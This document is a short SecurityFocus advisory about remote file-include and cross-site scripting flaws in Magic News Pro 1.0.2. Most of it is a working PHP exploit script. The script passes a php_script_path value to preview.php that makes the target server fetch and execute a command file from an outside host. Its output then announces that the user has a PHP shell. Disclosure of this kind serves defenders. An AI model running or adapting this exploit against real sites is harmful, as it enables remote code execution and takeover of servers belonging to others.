source: http://www.securityfocus.com/bid/22661/info

Magic News Pro is prone to multiple input-validation vulnerabilities because the application fails to properly sanitize user-supplied input. These issues include a remote file-include issue and two cross-site scripting vulnerabilities.

An attacker can exploit these issues to execute arbitrary PHP code in the context of the webserver process or to steal cookie-based authentication credentials. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.

These issues affects version 1.0.2; other versions may also be vulnerable.

#!/usr/bin/php -q -d short_open_tag=on
<?
/*
/*   Magic News PHP Code Execution Exploit
/*  This exploit should allow you to execute commands
/*            By : HACKERS PAL
/*             WwW.SoQoR.NeT
*/
print_r('
/**********************************************/
/*       Magic News  Command Execution        */
/*    by HACKERS PAL <security@soqor.net>     */
/*         site: http://www.soqor.net         */');
if ($argc<2) {
print_r('
/* --                                         */
/* Usage: php '.$argv[0].' host
/* Example:                                   */
/*    php '.$argv[0].' http://localhost/
/**********************************************/
');
die;
}
error_reporting(0);
ini_set("max_execution_time",0);

$url=$argv[1]."/";
$exploit="preview.php?php_script_path=http://www.soqor.net/tools/cmd.txt?/soqor";
$page=$url.$exploit;
         Function get_page($url)
         {

                  if(function_exists("file_get_contents"))
                  {

                       $contents = file_get_contents($url);

                          }
                          else
                          {
                              $fp=fopen("$url","r");
                              while($line=fread($fp,1024))
                              {
                               $contents=$contents.$line;
                              }


                                  }
                       return $contents;
         }

     $newpage = get_page($page);

     if(eregi("Cannot execute a blank command",$newpage))
     {
       Die("\n[+] Exploit Finished\n[+] Go To : 
".$url."preview.php?php_script_path=http://www.soqor.net/tools/cmd.txt?/soqor\n[+] 
You Got Your Own PHP Shell\n/*        Visit us : WwW.SoQoR.NeT            
*/\n/**********************************************/");
             }
             Else
             {
                Die("\n[-] Exploit Failed\n/*        Visit us : 
WwW.SoQoR.NeT            
*/\n/**********************************************/");
                }
?>

